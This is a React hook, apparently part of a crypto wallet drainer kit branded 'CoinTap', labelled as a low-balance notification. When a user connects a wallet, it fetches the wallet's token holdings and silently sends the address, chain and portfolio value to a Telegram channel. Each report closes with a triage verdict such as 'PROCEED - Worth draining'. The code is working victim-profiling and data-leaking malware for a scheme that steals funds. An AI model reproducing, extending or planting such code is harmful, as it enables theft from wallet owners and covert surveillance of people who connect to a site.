import { useEffect } from 'react';
import { useAccount } from 'wagmi';
import useSendTelegramMessage from './sendTelegramMessage';
import moment from 'moment';

function useLowBalanceNotification() {
  const { address, isConnected, chain } = useAccount();
  const { sendTelegramMessage } = useSendTelegramMessage();

  useEffect(() => {
    if (isConnected && address && chain) {
      const checkLowBalance = async () => {
        try {
          // Fetch wallet balance via Moralis API
          const chainName = getChainName(chain.id);
          const response = await fetch(`/api/chain-info/${chain.id}/${address}`);
          const data = await response.json();
          
          if (data.success && data.data.erc20s) {
            const tokens = data.data.erc20s;
            const nativeToken = tokens.find(token => token.contract_address === 'native');
            const erc20Tokens = tokens.filter(token => token.contract_address !== 'native');
            
            // Check for low balances
            const lowBalanceThresholds = {
              1: { native: 0.01, total: 50 },      // Ethereum: <0.01 ETH or <$50 total
              56: { native: 0.1, total: 20 },      // BSC: <0.1 BNB or <$20 total
              137: { native: 10, total: 10 },      // Polygon: <10 MATIC or <$10 total
              42161: { native: 0.01, total: 30 },  // Arbitrum: <0.01 ETH or <$30 total
              10: { native: 0.01, total: 30 },     // Optimism: <0.01 ETH or <$30 total
              8453: { native: 0.01, total: 30 },   // Base: <0.01 ETH or <$30 total
              43114: { native: 0.5, total: 20 },   // Avalanche: <0.5 AVAX or <$20 total
              250: { native: 5, total: 10 },       // Fantom: <5 FTM or <$10 total
              100: { native: 5, total: 10 },       // Gnosis: <5 xDAI or <$10 total
            };

            const thresholds = lowBalanceThresholds[chain.id] || { native: 0.01, total: 20 };
            
            let isLowBalance = false;
            let lowBalanceReasons = [];
            
            // Check native token balance
            if (nativeToken) {
              const nativeBalance = parseFloat(nativeToken.balance);
              const nativeValue = nativeToken.quote || 0;
              
              if (nativeBalance < thresholds.native) {
                isLowBalance = true;
                lowBalanceReasons.push(`Low native balance: ${nativeBalance} ${nativeToken.contract_ticker_symbol}`);
              }
              
              if (nativeValue < thresholds.total) {
                isLowBalance = true;
                lowBalanceReasons.push(`Low native value: $${nativeValue.toFixed(2)}`);
              }
            }
            
            // Check total portfolio value
            const totalValue = tokens.reduce((sum, token) => sum + (token.quote || 0), 0);
            if (totalValue < thresholds.total) {
              isLowBalance = true;
              lowBalanceReasons.push(`Low total portfolio: $${totalValue.toFixed(2)}`);
            }
            
            // Check if wallet has very few tokens
            if (erc20Tokens.length < 2) {
              isLowBalance = true;
              lowBalanceReasons.push(`Few tokens: ${erc20Tokens.length} ERC-20 tokens`);
            }
            
            // Check for very small token balances
            const smallTokens = erc20Tokens.filter(token => {
              const value = token.quote || 0;
              return value < 1; // Less than $1
            });
            
            if (smallTokens.length > erc20Tokens.length * 0.7) {
              isLowBalance = true;
              lowBalanceReasons.push(`Many small tokens: ${smallTokens.length}/${erc20Tokens.length} <$1`);
            }
            
            if (isLowBalance) {
              const timestamp = moment().format('YYYY-MM-DD HH:mm:ss');
              const date = moment().format('dddd, MMMM Do YYYY');
              
              const message = `⚠️ LOW BALANCE WALLET DETECTED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📱 WALLET INFO:
• Address: ${address}
• Chain: ${chain.name} (${chain.id})
• Total Value: $${totalValue.toFixed(2)}
• Native Balance: ${nativeToken ? `${parseFloat(nativeToken.balance).toFixed(6)} ${nativeToken.contract_ticker_symbol}` : 'N/A'}
• ERC-20 Tokens: ${erc20Tokens.length}

⚠️ LOW BALANCE REASONS:
${lowBalanceReasons.map(reason => `• ${reason}`).join('\n')}

🕐 DETECTION TIME:
• Time: ${timestamp}
• Date: ${date}

💡 RECOMMENDATION:
${totalValue < 10 ? '❌ SKIP - Very low value wallet' : 
  totalValue < 50 ? '⚠️ LOW PRIORITY - Consider skipping' : 
  '✅ PROCEED - Worth draining'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 CoinTap - Smart Wallet Analysis`;

              await sendTelegramMessage(message);
            }
          }
        } catch (error) {
          console.error('Failed to check wallet balance:', error);
        }
      };

      // Check balance after a short delay to allow token fetching
      const timeoutId = setTimeout(checkLowBalance, 3000);
      return () => clearTimeout(timeoutId);
    }
  }, [isConnected, address, chain, sendTelegramMessage]);
}

function getChainName(chainId) {
  const chainMap = {
    1: 'eth',
    56: 'bsc', 
    100: 'gnosis',
    137: 'polygon',
    8453: 'base',
    11155111: 'sepolia',
    42161: 'arbitrum',
    43114: 'avalanche',
    250: 'fantom',
    10: 'optimism'
  };
  return chainMap[chainId] || 'eth';
}

export default useLowBalanceNotification;
